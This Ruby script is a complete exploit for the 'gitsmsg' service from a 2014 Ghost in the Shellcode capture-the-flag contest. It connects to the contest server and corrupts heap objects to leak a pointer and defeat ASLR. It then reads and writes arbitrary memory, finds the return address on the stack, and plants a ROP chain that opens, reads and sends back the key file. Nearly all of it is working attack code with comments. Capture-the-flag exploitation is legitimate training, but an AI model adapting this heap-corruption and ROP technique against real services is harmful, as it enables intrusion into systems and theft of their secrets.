require 'socket'
require 'timeout'

MESSAGE_LOGIN        = 0x01
MESSAGE_DELETE       = 0x02
MESSAGE_STORE        = 0x04
MESSAGE_GET          = 0x05
MESSAGE_SEND_QUEUED  = 0x07
MESSAGE_EDIT         = 0x08
MESSAGE_QUIT         = 0x09

VARDATA_TYPE_BYTE         = 0x10
VARDATA_TYPE_INT          = 0x11
VARDATA_TYPE_DOUBLE       = 0x12
VARDATA_TYPE_BYTE_ARRAY   = 0x13
VARDATA_TYPE_INT_ARRAY    = 0x14
VARDATA_TYPE_DOUBLE_ARRAY = 0x15
VARDATA_TYPE_STRING       = 0x16

# 10 A's, followed by a null (so it doesn't wind up too long), then pad
# the rest of the way to 0x100 bytes (the required length)
DEFAULT_FROM_USERNAME = ("A" * 10) + "\0" + "A" * (0x100 - 11)
DEFAULT_TO_USERNAME   = ("B" * 10) + "\0" + "B" * (0x100 - 11)
KEY_PATH              = "/home/gitsmsg/key"

STACK_MIN = 0xBF800000
STACK_MAX = 0xBFFFFFFF

# This is where the main loop function returns, and therefore what I
# want to edit on the stack
MAIN_RETURN_ADDRESS = 0x0e74

# Pop(s)/return
PPPR = 0x00002755
PPR  = 0x00002756
PR    = 0x00002757

# Offsets to certain in-memory functions
OPEN  = 0x00000c90
READ  = 0x00000b60
WRITE = 0x00000ce0

# Offset where the file descriptor is stored
FD    = 0x00005164

# Offset to a string that we can leak (which gives the
# ability to calculate the base address)
VERSION_STRING = 0x2bb0

# Retrieve exactly one integer from the socket
def get_int(s, context = "?")
  int = s.recv(4)

  if(int.nil? || int.length != 4)
    puts("Receive failed :: #{context}");
    exit
  end

  return int.unpack("I").pop
end

# Receive a response code, and die if it's not what we're expecting
def receive_code(s, expected, context)
  code = get_int(s, context)

  if(code != expected)
    puts("Error! Unexpected response: 0x%08x :: %s" % [code, context])
    puts("Often, re-running it will fix this, it's due to network or randomization issues")
    exit
  end
end

# Send the "login" message - this is required before doing anything
def login(s, username = DEFAULT_FROM_USERNAME)
  out = [MESSAGE_LOGIN, username].pack("Ia*")
  s.write(out)
  receive_code(s, 0x00001001, "login")
end

# Store one of the various datatypes
def store(s, vardata_type, vardata, to_username = DEFAULT_TO_USERNAME)
  out = [MESSAGE_STORE, to_username].pack("Ia*")

  if(vardata_type == VARDATA_TYPE_BYTE)
    out += [1, vardata_type, vardata].pack("IIC")
  elsif(vardata_type == VARDATA_TYPE_INT)
    out += [4, vardata_type, vardata].pack("III")
  elsif(vardata_type == VARDATA_TYPE_DOUBLE)
    out += [8, vardata_type, vardata].pack("IIQ")
  elsif(vardata_type == VARDATA_TYPE_BYTE_ARRAY)
    out += [vardata.length, vardata_type].pack("II")
    out += vardata.pack("C*")
  elsif(vardata_type == VARDATA_TYPE_INT_ARRAY)
    out += [vardata.length, vardata_type].pack("II")
    out += vardata.pack("I*")
  elsif(vardata_type == VARDATA_TYPE_DOUBLE_ARRAY)
    out += [vardata.length, vardata_type].pack("II")
    out += vardata.pack("Q*")
  elsif(vardata_type == VARDATA_TYPE_STRING)
    out += [1, vardata_type, vardata].pack("III")
  else
    puts("wat")
    exit
  end

  s.write(out)
  receive_code(s, 0x00001004, "store")
end

# Send an 'edit' message
def edit(s, id, index, new_data)
  out = [MESSAGE_EDIT, id, index, new_data].pack("IIIa*")
  s.write(out)

  receive_code(s, 0x00001004, "edit")
end

# Retrieve the object. Return it as a series of bytes, no matter
# the type.
#
# The id refers to the object's id. The most recent object is 0,
# the second is 1, etc.
def get(s, id)
  out = [MESSAGE_GET, id].pack("II")
  s.write(out)

  # Type (don't care)
  get_int(s)

  # Length
  len = get_int(s)

  #puts("Retrieving #{len} bytes")
  data = s.recv(len)

  # It should end with this code
  receive_code(s, 0x00001004, "get")

  return data

end

def quit(s)
  s.write([MESSAGE_QUIT].pack("I"))
  receive_code(s, 0x00001003, "quit")
end

# Store a series of bytes in memory, and return the absolute address
# to where in memory those bytes are stored
def stash_data(s, data)
  # Store an array of doubles - this will allocate 4 bytes and overwrite 32
  store(s, VARDATA_TYPE_DOUBLE_ARRAY, [0x5e5e5e5e5e5e5e5e] * 4)

  # Store an array of bytes, which are the data. It will allocate a buffer
  # in which to store these bytes, a pointer to which is written over the
  # previous entry
  store(s, VARDATA_TYPE_BYTE_ARRAY, data.bytes.to_a)

  # Get bytes 24 - 27 of the double array, which is where a pointer to the
  # allocated buffer (containing 'data') will be stored
  result = get(s, 1)[24..27].unpack("I").pop

  puts("'%s' stored at 0x%08x" % [data, result])

  return result
end

# This function is kind of an ugly hack, but it works reliably so I can't really
# complain.
#
# It basically searches a large chunk of memory for a specific return address.
# When it finds that address, it returns there.
def find_return_address(s, base_addr)
  address_to_find = [base_addr + MAIN_RETURN_ADDRESS].pack("I")

  # Store an array of doubles. This will overlap the next allocation
  store(s, VARDATA_TYPE_DOUBLE_ARRAY, [0x5e5e5e5e5e5e5e5e] * 4)

  # Store an array of bytes. We'll be able to change the length and locatino
  # of this buffer in order to read arbitrary memory
  store(s, VARDATA_TYPE_BYTE_ARRAY, [0x41])

  # Overwrite the location and size of the byte array. The location will be
  # set to STACK_MIN, and the size will be set to STACK_MAX - STACK_MIN
  edit(s, 1, 3, [STACK_MIN, (STACK_MAX - STACK_MIN)].pack("II"))
  puts("Reading the stack (0x%08x - 0x%08x)..." % [STACK_MIN, STACK_MAX])

  # We have to re-implement "get" here, so we can handle a large buffer and
  # so we can quit when we find what we need
  out = [MESSAGE_GET, 0].pack("II")
  s.write(out)
  get_int(s) # type (don't care)
  len = get_int(s)
  result = ""

  # Loop and read till we either reach the end, of we find the value we need
  while(result.length < len)
    result = result + s.recv(STACK_MAX - STACK_MIN + 1)

    # As soon as we find the location, end
    if(loc = result.index(address_to_find))
      return STACK_MIN + loc
    end
  end

  # D'awww :(
  puts("Couldn't find the return address :(")
  exit
end

# This generates the ROP stack. It's a simple open + read + write. The
# only thing I'm not proud of here is that I make an assumption about what
# the file handle will be after the open() call - but it seems to reliably
# be '1' in my testing
def get_rop(file_path, base_addr, fd)
    stack = [
      # open(filename, 0)
      base_addr + OPEN,  # open()
      base_addr + PPR,   # pop/pop/ret
      file_path,         # filename = value we created
      0,                 # flags

      # read(fd, filename, 100) # We're re-using the filename as a buffer
      base_addr + READ,  # read()
      base_addr + PPPR,  # pop/pop/pop/ret
      0,                 # fd - Because all descriptors are closed, the first available descriptor is '0'
      file_path,         # buf
      100,               # count

      # write(fd, filename, 0)
      base_addr + WRITE, # write()
      base_addr + PPPR,  # pop/pop/pop/ret
      fd,                # fd
      file_path,         # buf
      100,               # count

      # This was simply for testing, it sends 4 bytes then exits
      #base_addr + 0x2350
    ]

    return stack
end

# This changes the return address, and writes the ROP payload to the
# stack
def write_payload_to_stack(s, return_address, stack)
  # Allocate a couple more chunks. Once again, the second will be overwritten
  # (and therefore controllable) from the first
  store(s, VARDATA_TYPE_DOUBLE_ARRAY, [0x5e5e5e5e5e5e5e5e] * 4)
  store(s, VARDATA_TYPE_INT_ARRAY, [0x41414141])

  # Change the address of the INT array to the return address we
  # want to overwrite, and change its size to the size of the payload
  edit(s, 1, 3, [return_address, stack.length].pack("II"))

  # For each element in the payload, write it to the corresponding element
  # in the array (ie, on the stack). This unfortunately can't be done in batch,
  # because the software only lets you edit arrays one element at a time :(
  0.upto(stack.length - 1) do |i|
    edit(s, 0, i, [stack[i]].pack("I"))
  end
end

# To bypass ASLR, we need an address. It's possible to leak those addresses using
# the contrived "indexed string" message. Basically, we write a long array, write
# another array over top of the end that contains the address, then read the
# address back
def get_base_address(s)
  # Allocate a long double (will be 8* longer in memory)
  store(s, VARDATA_TYPE_DOUBLE_ARRAY, [0x4444444444444444]*4)

  # Allocate a string that contains a useful pointer. It will end up writing over
  # top of the double array
  store(s, VARDATA_TYPE_STRING, 0)

  # Read the address from the double array
  addr = get(s, 1)[0x18..0x1b].unpack("I").pop

  # VERSION_STRING is the address in memory where the leaked string lives, so
  # subtracting the VERSION_STRING address will leave us with the base address
  addr = addr - VERSION_STRING

  return addr
end

# Read the file descriptor from memory. Uses the usual trick of writing an overly
# long array, writing a short next to it, then using the long array to replace the
# pointer in the short array.
def get_fd(s, base)
  # Allocate 8 bytes and write a 32-byte array into it
  store(s, VARDATA_TYPE_DOUBLE_ARRAY, [0x5e5e5e5e5e5e5e5e] * 4)

  # Allocate an int array, whose pointer we will overwrite
  store(s, VARDATA_TYPE_INT_ARRAY, [0x41414141])

  # Replace the array's pointer with a pointer to the file
  # descriptor
  edit(s, 1, 3, [base + FD, 1].pack("II"))

  # Read the array, which will now contain the file descriptor
  return get(s, 0).unpack("I").pop
end

#s = TCPSocket.new("localhost", 8585)
s = TCPSocket.new("gitsmsg.2014.ghostintheshellcode.com", 8585)

puts("** Initializing")
receive_code(s, 0x00001000, "init")

puts("** Logging in")
login(s)

# We add a bunch of NULL bytes to the path to clear the buffer,
# which makes it prettier to display later
puts("** Stashing a path to the file on the heap")
file_path = stash_data(s, KEY_PATH + ("\0" * 100))

puts("** Using a memory leak to get the base address [ASLR Bypass]")
base_addr = get_base_address(s)
puts("... found it @ 0x%08x!" % base_addr)

puts("** Reading the file descriptor from memory")
fd = get_fd(s, base_addr)
puts("... it's #{fd}!")

puts("** Searching stack memory for the return address [Another ASLR Bypass]")
return_address = find_return_address(s, base_addr)
puts("... found it @ 0x%08x" % return_address)

puts("** Generating the ROP chain [DEP Bypass]")
stack = get_rop(file_path, base_addr, fd)

puts("** Writing the ROP chain to the stack")
write_payload_to_stack(s, return_address, stack)

puts("** Sending a 'quit' message, to trigger the payload")
quit(s)

puts("** Crossing our fingers and waiting for the password")

a = s.recv(100)
puts(a)
